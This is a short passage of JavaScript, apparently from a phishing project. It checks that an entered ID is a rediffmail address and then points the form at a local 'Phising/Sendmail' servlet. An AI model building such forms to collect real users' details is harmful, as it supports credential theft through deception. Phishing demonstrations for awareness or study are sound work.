...
else if(to.lastIndexOf("@rediffmail.com")==-1)
alert("Please Enter Valid ID. ex senthil@rediffmail.com")
else
{

document.forms[0].action="http://localhost:8084/Phising/Sendmail";
